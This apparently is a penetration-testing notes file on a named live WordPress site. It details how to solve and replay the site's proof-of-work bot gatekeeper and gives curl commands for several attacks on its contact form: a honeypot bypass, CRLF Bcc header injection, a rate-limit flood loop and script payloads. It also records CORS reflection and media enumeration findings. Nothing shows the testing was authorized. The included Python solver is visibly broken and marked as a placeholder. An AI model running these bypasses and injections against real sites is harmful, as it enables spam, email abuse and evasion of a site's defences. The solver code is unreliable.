# Partisia Foundation — WordPress / WPForms / Simply Gatekeeper (2026-08)

## Stack
- WordPress + Blocksy + Elementor 4.1.4/Pro + WPForms (form 8509, post 8500) + Yoast 28.0 + Wordfence + Site Kit + WP Rocket.
- Simply.com: `Server: Simply.com`, `SimplyCom-Server: Apache`. Only `X-Content-Type-Options: nosniff`; missing CSP/HSTS/XFO/Permissions-Policy/COOP.
- wp-json namespaces: oembed, wordfence/v1, yoast/v1, elementor*, wp/v2. Totals pages 16, media 332 (X-WP-Total).

## Trojan gatekeeper
- No `sc_clearance` => 454 challenge page. JS: `T=<hex>`, `TS=<unix>`, `D=16`, worker `sha256(T:nonce)`, `lz>=D`. Submit `POST /.sc-verify/` `ts+nonce+token` => `{"ok":true,"cookie":"TS|hmac"}` + `Set-Cookie: sc_clearance=TS|hmac; Max-Age=86400; Domain=target; SameSite=None;Secure`.
- Solver PoW (Python, <0.1s):
  ```python
  import hashlib
  def lz(h):
    b=0
    for c in h:
      n=int(c,16)
      if n==0: b+=4
      else:
        b+= {0:4,1:3,2:2,3:2,4:1,5:1,6:1,7:1}.get(n,0) if n<8 else 0
        break
    return b # actually implement loop as in original
  # naive:
  nonce=0
  while True:
    if lz(hashlib.sha256(f"{T}:{nonce}".encode()).hexdigest())>=D: break
    nonce+=1
  ```
- With clearance: `GET /`, `/wp-json/`, `/wp-admin/admin-ajax.php?action=heartbeat` => 200. Sensitive paths (`/.env`, `/wp-config.php`, `/.git`, `/wp-login.php`, `/xmlrpc.php`, `/wp-admin/`) stay **455 Security Incident** — hard-block login brute.
- Cookie replayable: copy `sc_clearance` value to new session => still 200 (no IP/UA binding, 24h).

## WPForms endpoint
- `POST https://TARGET/wp-admin/admin-ajax.php`
  Headers: `X-Requested-With: XMLHttpRequest`, `Referer: https://TARGET/get-in-touch/`, `Origin: https://TARGET`, `Cookie: sc_clearance=...`, `User-Agent: Firefox 128`.
  Body (urlencoded): `action=wpforms_submit&wpforms[id]=8509&wpforms[post_id]=8500&page_title=Get in Touch&page_url=https://TARGET/get-in-touch/&page_id=8500&wpforms[fields][1][first]=Warung&wpforms[fields][1][last]=Hunter&wpforms[fields][2]=a@warung.local&wpforms[fields][3]=msg&wpforms[fields][4]=`
- Responses JSON: `{"success":true,"data":{"confirmation":"<div ...>Thanks..."}}` vs `{"success":false,"data":{"errors":{general:{header:...},field:{...}}}}`.

## Invariant probes (curl)
```bash
B=https://partisiafoundation.com
CK="sc_clearance=TS|HMAC"
# honeypot must block — but passes
curl -s -b "$CK" -H "X-Requested-With: XMLHttpRequest" -H "Referer: $B/get-in-touch/" -d "action=wpforms_submit&wpforms[id]=8509&wpforms[fields][1][first]=Bot&wpforms[fields][1][last]=Trap&wpforms[fields][2]=bot@warung.local&wpforms[fields][3]=hi&wpforms[fields][4]=FILLED_SHOULD_FAIL" $B/wp-admin/admin-ajax.php | jq .success
# => true  (VULN)

# CRLF in name
curl -s -b "$CK" -H "X-Requested-With: XMLHttpRequest" -H "Referer: $B/get-in-touch/" --data-urlencode "wpforms[fields][1][first]=Warung
Bcc:evil@warung.local" -d "action=wpforms_submit&wpforms[id]=8509&wpforms[fields][1][last]=H&wpforms[fields][2]=a@warung.local&wpforms[fields][3]=x" $B/wp-admin/admin-ajax.php | jq .

# rate-limit (10 in 6s, all true)
for i in $(seq 1 10); do curl -s -b "$CK" -H "X-Requested-With: XMLHttpRequest" -H "Referer: $B/get-in-touch/" -d "action=wpforms_submit&wpforms[id]=8509&wpforms[fields][1][first]=RL$i&wpforms[fields][1][last]=T&wpforms[fields][2]=rl$i@warung.local&wpforms[fields][3]=msg$i" $B/wp-admin/admin-ajax.php | jq .success & done; wait

# WAF blocks script
curl -s -b "$CK" -H "X-Requested-With: XMLHttpRequest" -H "Referer: $B/get-in-touch/" -d "action=wpforms_submit&wpforms[id]=8509&wpforms[fields][1][first]=W&wpforms[fields][1][last]=H&wpforms[fields][2]=x@warung.local&wpforms[fields][3]=<script>alert(1)</script>" $B/wp-admin/admin-ajax.php -w "%{http_code}\n"
# => 403  vs  <b>world</b> => 200 true
```

## Other findings
- REST pre-auth safe: `GET /wp-json/wp/v2/users` 401, `/wp/v2/users/me` 401, `POST /wp/v2/users` 401, `POST /wp/v2/media` 401, `POST /wp/v2/comments` 401, `/batch/v1` 403 WAF.
- Media enumeration public: `GET /wp-json/wp/v2/media?per_page=100` 200, `X-WP-Total:332`, IDs 9621 descending, `author:2`, empty on `/.well-known/security.txt` 404.
- Search XSS: `GET /?s=<script>` 403, `?s={{7*7}}` 200 reflected (no exec), encoded payloads vary.
- CORS: `Origin: https://evil.com` => `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true` on `/wp-json/wp/v2/posts` (reflective WP REST).

## Workspace
- /root/partisia_audit: pow_bypass.py, session.pkl, FINAL_REPORT.md, deep_recon.log, hunt_invariants.log (H1-H18 + RL), wafter.log, more_hunt.log, final_checks.log, extra_10min.log, media_dump.json
